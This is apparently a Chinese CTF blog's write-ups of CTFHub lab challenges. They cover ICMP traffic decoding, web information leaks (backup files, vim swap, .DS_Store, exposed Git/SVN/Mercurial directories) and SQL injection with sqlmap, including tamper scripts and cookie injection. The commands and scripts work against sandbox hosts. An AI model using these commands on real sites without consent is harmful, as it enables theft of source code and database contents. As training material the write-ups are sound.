<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s += <span class="built_in">chr</span>(x - <span class="number">42</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
<p>并将每个 request / reply 的长度输入进去，最后输入 <span
class="math inline">\(0\)</span> 即可得到 flag。</p>
<h3 id="lengthbinary">LengthBinary</h3>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Misc -&gt; 流量分析 -&gt;
协议流量分析 -&gt; ICMP -&gt; LengthBinary</p>
<p>我们使用 Wireshark 打开：</p>
<img src="/ctf-flow-notes/binary.png" class="">
<p>观察文件，我们可发现 request / reply
只有两种长度，于是我们猜测为二进制表示字符串，其中两种长度分别代表 <span
class="math inline">\(0\)</span> 和 <span
class="math inline">\(1\)</span>。</p>
<p>于是我们编写下列 Python 程序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">74</span>:</span><br><span class="line">        n = <span class="number">2</span> * n</span><br><span class="line">        m = <span class="number">2</span> * m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">106</span>:</span><br><span class="line">        n = <span class="number">2</span> * n + <span class="number">1</span></span><br><span class="line">        m = <span class="number">2</span> * m</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (cnt == <span class="number">8</span>):</span><br><span class="line">        s += <span class="built_in">chr</span>(n)</span><br><span class="line">        t += <span class="built_in">chr</span>(m)</span><br><span class="line">        n = m = cnt = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
<p>将每个 request / reply 的长度输入进去，最后输入 <span
class="math inline">\(0\)</span>。我们可获得两个字符串，其中格式为
<code>ctfhub&#123;XXXXXX&#125;</code> 的即为 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>OIer 的 CTF Web 信息泄露学习笔记</title>
    <url>/ctf-info-notes/</url>
    <content><![CDATA[<p>搜集信息是 CTFer
的基本技能。网站的站长可能在部署等操作中忘记删除备份及重要的文件。我们可以通过这些文件找到
flag。</p>
<p>本文一切例题均可在 <a href="https://www.ctfhub.com/">CTFHub</a>
找到。</p>
<span id="more"></span>
<h1 id="目录遍历">目录遍历</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt;
目录遍历</p>
<p>本题挨着挨着点目录就可以了。当然还有其他的方法。</p>
<h2 id="dirb-介绍"><code>dirb</code> 介绍</h2>
<p><code>dirb</code> 是一个 Web 目录扫描工具，且 Kali Linux
自带。用法很简单，只需在终端输入 <code>dirb &lt;URL&gt;</code>
即可。</p>
<p>如下列是一种扫描结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ dirb http://challenge-XXX.sandbox.ctfhub.com:XXXXX/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Feb  9 19:30:19 2023</span><br><span class="line">URL_BASE: http://challenge-XXX.sandbox.ctfhub.com:XXXXX/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://challenge-XXX.sandbox.ctfhub.com:XXXXX/ ----</span><br><span class="line">+ http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php (CODE:200|SIZE:581)</span><br><span class="line">+ http://challenge-XXX.sandbox.ctfhub.com:XXXXX/server-status (CODE:403|SIZE:313)</span><br><span class="line">==&gt; DIRECTORY: http://challenge-XXX.sandbox.ctfhub.com:XXXXX/static/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://challenge-XXX.sandbox.ctfhub.com:XXXXX/static/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Feb  9 19:34:01 2023</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure>
<h1 id="phpinfo">PHPINFO</h1>
<p>PHPINFO 是 PHP 生成配置信息的页面。我们可以在 PHPINFO
中看到可能有用的信息。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt;
PHPINFO</p>
<p>我们可以直接打开 phpinfo.php 页面，全局搜索 <code>ctfhub&#123;</code>
即可获得 flag。</p>
<img src="/ctf-info-notes/phpinfo.png" class="">
<h1 id="备份文件">备份文件</h1>
<p>网站上可能有未删除的备份文件，我们可以利用这些文件。</p>
<h2 id="网页源码">网页源码</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt;
备份文件下载</p>
<p>我们可以使用 Python 写个脚本来获得可能的网页源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&#x27;</span></span><br><span class="line">name = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">suffix = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> suffix:</span><br><span class="line">        rUrl = url + i + <span class="string">&#x27;.&#x27;</span> + j</span><br><span class="line">        req = requests.get(rUrl)</span><br><span class="line">        <span class="keyword">if</span>(req.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(rUrl)</span><br></pre></td></tr></table></figure>
<p>然后在 Kali Linux 下运行即可得到网页源码的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ python test.py</span><br><span class="line">http://challenge-XXX.sandbox.ctfhub.com:XXXXX/www.zip</span><br></pre></td></tr></table></figure>
<p>解压该文件，可发现 <code>flag_XXXXXX.txt</code>
文件。我们直接打开这个文件，发现 flag 不在里面。于是我们访问
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/flag_XXXXXX.txt</code>，找到
flag。</p>
<h2 id="bak-文件">bak 文件</h2>
<p>bak 文件是备份文件。站长可能会在部署时忘记删除 bak 文件。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; bak
文件</p>
<p>题目主页为
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php</code>，于是我们可以访问
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php.bak</code>
下载备份文件。</p>
<p>用记事本打开即可看到 flag。</p>
<h2 id="vim-缓存">vim 缓存</h2>
<p>vim 是一个知名的编辑器。但使用 vim 可能会留下未删除的缓存文件。一般为
<code>.&lt;filename&gt;.swp</code>、<code>.&lt;filename&gt;.swo</code>、<code>.&lt;filename&gt;.swn</code>、<code>&lt;filename&gt;~</code>、<code>.&lt;filename&gt;.un.~</code>
等。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; vim
缓存</p>
<p>题目主页为
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php</code>，于是我们可以访问
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/.index.php.swp</code>
下载 vim 缓存文件。</p>
<p>然后执行命令 <code>vim -r index.php.swp</code> 修复文件即可看到
flag。</p>
<h2 id="ds_store">.DS_Store</h2>
<p>.DS_Store 是 macOS
保存文件夹属性的隐藏文件。我们可以从该文件进行突破。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt;
.DS_Store</p>
<p>题目主页为
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/</code>，于是我们可以访问
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/.DS_Store</code>
下载 .DS_Store 文件。</p>
<p>由于 macOS 为类 UNIX 系统，我们需要将其放在 Linux 中读写。以下为在
Kali Linux 下读取的结果（不可见字符已用 <code>?</code> 代替）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ cat DS_Store</span><br><span class="line">?B?d1</span><br><span class="line">   �</span><br><span class="line">     ?????</span><br><span class="line">??DSDB??@?�?????????@?�????????? ?@?�????????? ?@?$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.txtnoteustr</span><br><span class="line">flag here!</span><br></pre></td></tr></table></figure>
<p>我们注意到 <code>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.txt</code>
文件，于是我们访问网址
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.txt</code>
即可得到 flag。</p>
<h1 id="git-泄露">Git 泄露</h1>
<p>Git 是一个著名的版本控制工具。通过 Git 我们可以还原历史记录。</p>
<p>我们可以使用 <a
href="https://github.com/BugScanTeam/GitHack">GitHack</a> 工具下载 .git
目录进行操作。直接在终端输入
<code>python2 GitHack.py &lt;URL&gt;/.git</code> 即可。</p>
<h2 id="log">Log</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; Git 泄露
-&gt; Log</p>
<p>我们可以使用 GitHack 下载 .git 目录（部分信息已用省略号代替）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack]</span><br><span class="line">└─$ python2 GitHack.py http://challenge-XXX.sandbox.ctfhub.com:XXXXX/.git</span><br><span class="line"></span><br><span class="line">  ____ _ _   _   _            _</span><br><span class="line"> / ___(_) |_| | | | __ _  ___| | __</span><br><span class="line">| |  _| | __| |_| |/ _` |/ __| |/ /</span><br><span class="line">| |_| | | |_|  _  | (_| | (__|   &lt;</span><br><span class="line"> \____|_|\__|_| |_|\__,_|\___|_|\_\&#123;0.0.5&#125;</span><br><span class="line"> A &#x27;.git&#x27; folder disclosure exploit.</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[+] Clone Success. Dist File : /home/xenonwzh/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX</span><br></pre></td></tr></table></figure>
<p>进入目录，使用 <code>git log</code> 查看历史记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ git log</span><br><span class="line">commit 6a33734b8bd143ae206f09038228b5710eb977ff (HEAD -&gt; master)</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    remove flag</span><br><span class="line"></span><br><span class="line">commit 456770445cf233de909d4c743c7cf91920a10dcd</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br><span class="line"></span><br><span class="line">commit b3b431f8245eb637be4efe11a8f507802b55f76e</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    init</span><br></pre></td></tr></table></figure>
<p>于是我们可以使用 <code>git diff</code> 对比 <code>add flag</code>
的版本，获得 flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ git diff 456770445cf233de909d4c743c7cf91920a10dcd</span><br><span class="line">diff --git a/18640211316292.txt b/18640211316292.txt</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index ce5a593..0000000</span><br><span class="line">--- a/18640211316292.txt</span><br><span class="line">+++ /dev/null</span><br><span class="line">@@ -1 +0,0 @@</span><br><span class="line">-ctfhub&#123;XXXXXX&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stash">Stash</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; Git 泄露
-&gt; Stash</p>
<p>使用 GitHack 获得 .git 文件夹之后我们可以执行
<code>git stash lish</code> 检查有没有 stash：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on master: c436a51 add flag</span><br></pre></td></tr></table></figure>
<p>于是我们可以使用 <code>git stash pop</code> 指令弹出这个 stash：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-5fca1df134e70746.sandbox.ctfhub.com_10800]</span><br><span class="line">└─$ git stash pop</span><br><span class="line">CONFLICT (modify/delete): 7219814831983.txt deleted in Updated upstream and modified in Stashed changes.  Version Stashed changes of 7219814831983.txt left in tree.</span><br><span class="line">On branch master</span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use &quot;git restore --staged &lt;file&gt;...&quot; to unstage)</span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; as appropriate to mark resolution)</span><br><span class="line">        deleted by us:   7219814831983.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br><span class="line">The stash entry is kept in case you need it again.</span><br></pre></td></tr></table></figure>
<p>我们可以发现多出了 <code>7219814831983.txt</code> 文件，打开即可发现
flag。</p>
<h2 id="index">Index</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; Git 泄露
-&gt; Index</p>
<p>我们使用同样的方法通过 GitHack 下载 .git 目录。</p>
<p>这次我们直接查看目录，可发现 <code>653494924880.txt</code>
文件，打开即可发现 flag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ ls</span><br><span class="line">50x.html  653494924880.txt  index.html</span><br><span class="line"></span><br><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ cat 653494924880.txt</span><br><span class="line">ctfhub&#123;XXXXXX&#125;</span><br></pre></td></tr></table></figure>
<h1 id="svn-泄露">SVN 泄露</h1>
<p>和 Git 类似，SVN 也是一个版本控制工具。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; SVN
泄露</p>
<p>在这我们可以使用 <a
href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a> 工具下载 .svn
文件夹，在终端输入 <code>./rip-svn.pl -u &lt;URL&gt;/.svn/</code>
即可。结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/dvcs-ripper]</span><br><span class="line">└─$ ./rip-svn.pl -u http://challenge-2ac8d70e059113a4.sandbox.ctfhub.com:10800/.svn/</span><br><span class="line">[i] Found new SVN client storage format!</span><br><span class="line">REP INFO =&gt; 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33</span><br><span class="line">[i] Trying to revert the tree, if you get error, upgrade your SVN client!</span><br><span class="line">Reverted &#x27;index.html&#x27;</span><br></pre></td></tr></table></figure>
<p>在这我们使用 VSCode 打开隐藏目录
<code>.svn</code>，进行全局搜索即可获得 flag。</p>
<img src="/ctf-info-notes/svn.png" class="">
<h1 id="hg-泄露">HG 泄露</h1>
<p>和 Git 类似，Mercurial 也是一个版本控制工具，且会留下 .hg 目录。</p>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; HG
泄露</p>
<p>我们可以同样使用 dvcs-ripper 工具下载 .hg 文件夹，在终端输入
<code>./rip-hg.pl -u &lt;URL&gt;/.hg/</code> 即可。结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/dvcs-ripperer]</span><br><span class="line">└─$ ./rip-hg.pl -u http://challenge-bc2c4b241118a1ca.sandbox.ctfhub.com:10800/.hg/</span><br><span class="line">[i] Getting correct 404 responses</span><br><span class="line">no changes needed to 50x.html</span><br><span class="line">no changes needed to index.html</span><br><span class="line">[i] Finished (2 of 38)</span><br></pre></td></tr></table></figure>
<p>我们可以使用同样的方法通过 VSCode 在 .hg 目录中全局搜索
flag，于是我们可以发现 <code>flag_129453157.txt</code> 文件。题目主页为
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/</code>，于是我们访问
<code>http://challenge-XXX.sandbox.ctfhub.com:XXXXX/flag_129453157.txt</code>
即可获得 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>OIer 的 CTF Web SQL 注入学习笔记</title>
    <url>/ctf-sql-notes/</url>
    <content><![CDATA[<p>某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL
注入获取数据库的信息。</p>
<p>一般来说网址或请求的末尾带有 <code>?id=1</code> 的字样我们就可以考虑
SQL 注入。</p>
<p><del>然而我完全不会 SQL，于是 sqlmap 大法好 QWQ</del></p>
<p>本文一切例题均可在 <a href="https://www.ctfhub.com/">CTFHub</a>
找到。</p>
<span id="more"></span>
<h1 id="sqlmap-介绍"><code>sqlmap</code> 介绍</h1>
<p>sqlmap 是一个协助 SQL 注入的工具，且 Kali Linux
自带。我们可以很方便地获取数据库的信息。</p>
<p>常用方法如下表：</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-u &lt;URL&gt;</code></td>
<td>指定注入链接为 <code>&lt;URL&gt;</code></td>
</tr>
<tr class="even">
<td><code>-r &lt;filename&gt;</code></td>
<td>指定注入网站的 HTTP 请求为 <code>&lt;filename&gt;</code>
文本文件中的内容</td>
</tr>
<tr class="odd">
<td><code>--dbs</code></td>
<td>获取数据库数据</td>
</tr>
<tr class="even">
<td><code>--tables</code></td>
<td>获取表信息</td>
</tr>
<tr class="odd">
<td><code>--columns</code></td>
<td>获取列信息</td>
</tr>
<tr class="even">
<td><code>--dump</code></td>
<td>获取字段内容</td>
</tr>
<tr class="odd">
<td><code>-D &lt;name&gt;</code></td>
<td>指定搜索的数据库为 <code>&lt;name&gt;</code></td>
</tr>
<tr class="even">
<td><code>-T &lt;name&gt;</code></td>
<td>指定搜索的表为 <code>&lt;name&gt;</code></td>
</tr>
<tr class="odd">
<td><code>-C &lt;name&gt;</code></td>
<td>指定搜索的列为 <code>&lt;name&gt;</code></td>
</tr>
<tr class="even">
<td><code>--level &lt;num&gt;</code></td>
<td>指定搜索等级为 <code>&lt;num&gt;</code></td>
</tr>
<tr class="odd">
<td><code>--cookie "&lt;string&gt;"</code></td>
<td>指定访问网页时的 Cookie 为 <code>&lt;string&gt;</code></td>
</tr>
<tr class="even">
<td><code>-p "&lt;string&gt;"</code></td>
<td>指定测试的类型为 <code>&lt;string&gt;</code></td>
</tr>
<tr class="odd">
<td><code>--tamper "&lt;filename&gt;"</code></td>
<td>附加名为 <code>&lt;filename&gt;</code> 的脚本</td>
</tr>
</tbody>
</table>
<h1 id="使用-sqlmap-进行-sql-注入">使用 sqlmap 进行 SQL 注入</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt;
整数型注入 / 字符型注入 / 报错注入 / 布尔盲注 / 时间盲注 / MySQL
结构</p>
<p>这些题都可用以下套路解决：</p>
<p>输入 1，我们可以在网址上看到 <code>?id=1</code>
的字样，于是我们可以使用 sqlmap 进行 SQL 注入。</p>
<p>在终端中输入以下指令，可获得数据库的信息（部分信息已用省略号代替）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.7#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:54:00 /2023-02-10/</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] y</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">GET parameter &#x27;id&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sqli</span><br><span class="line"></span><br><span class="line">[08:54:35] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-XXX.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:54:35 /2023-02-10/</span><br></pre></td></tr></table></figure>
<p>于是我们可知有
<code>information_schema</code>、<code>mysql</code>、<code>performance_schema</code>
和 <code>sqli</code> 四个数据库。我们选择 <code>sqli</code>
数据库进行注入（部分信息已用省略号代替）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 -D sqli --tables</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">[08:59:23] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-XXX.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:59:23 /2023-02-10/</span><br></pre></td></tr></table></figure>
<p>于是我们可得到 <code>flag</code> 和 <code>news</code>
两个表，我们选择注入 <code>flag</code>
表（部分信息已用省略号代替）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~]</span><br><span class="line">└─$ sqlmap -u http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1 -D sqli -T flag --columns --dump</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br><span class="line"></span><br><span class="line">[08:59:35] [INFO] fetching columns for table &#x27;flag&#x27; in database &#x27;sqli&#x27;</span><br><span class="line">[08:59:35] [INFO] fetching entries for table &#x27;flag&#x27; in database &#x27;sqli&#x27;</span><br><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;XXXXXX&#125;                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line"></span><br><span class="line">[08:59:35] [INFO] table &#x27;sqli.flag&#x27; dumped to CSV file &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-c35f0537e0f328ea.sandbox.ctfhub.com/dump/sqli/flag.csv&#x27;</span><br><span class="line">[08:59:35] [INFO] fetched data logged to text files under &#x27;/home/xenonwzh/.local/share/sqlmap/output/challenge-c35f0537e0f328ea.sandbox.ctfhub.com&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:59:35 /2023-02-10/</span><br></pre></td></tr></table></figure>
<p>于是我们就获得了 flag。</p>
<h1 id="过滤空格">过滤空格</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt;
过滤空格</p>
<p>在注入时候空格被过滤掉了，这时我们可以使用 <code>/**/</code>
来代替空格。</p>
<p>sqlmap 有一个附加脚本 <code>space2comment.py</code> 可将空格替换成
<code>/**/</code>，正好可解决这个问题。</p>
<p>于是我们执行以下指令即可：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli -T kttcekvceq --columns --dump</span><br></pre></td></tr></table></figure>
<p>于是可获得 flag。</p>
<h1 id="cookie-注入">Cookie 注入</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; Cookie
注入</p>
<p>利用 brupsuite 抓包，发现注入点在 Cookie 中，于是我们可以使用 sqlmap
进行 Cookie 注入。</p>
<p>注意我们需要对 sqlmap 设置 <code>--level 2</code> 才能使其扫描
Cookie。执行代码如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 -D sqli -T hxwrqtoxda --columns --dump</span><br></pre></td></tr></table></figure>
<h1 id="ua-注入">UA 注入</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; UA
注入</p>
<p>这道题的注入点在 User-Agent 中。</p>
